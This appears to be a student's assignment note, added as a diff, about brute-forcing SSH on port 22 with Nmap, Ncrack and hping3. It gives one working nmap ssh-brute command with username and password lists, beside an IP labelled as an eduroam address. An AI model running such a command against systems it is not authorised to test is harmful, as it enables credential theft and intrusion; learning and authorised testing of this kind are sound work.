@@ -1,0 +1,12 @@
+How can you launch the brute force attack on port 22(ssh) using Nmap,Ncrack, 
+hping3 on Linux. 
+
+You have the host IP already . 
+
+Assignment # 3
+This is assignment # 3 you need to submit it by coming Friday
+
+
+nmap command:
+nmap -p22 --script ssh-brute.nse --script-args userdb="usernames.txt", passdb="passwords.txt" ipOfMachine
+eduroam ip: 172.16.253.1
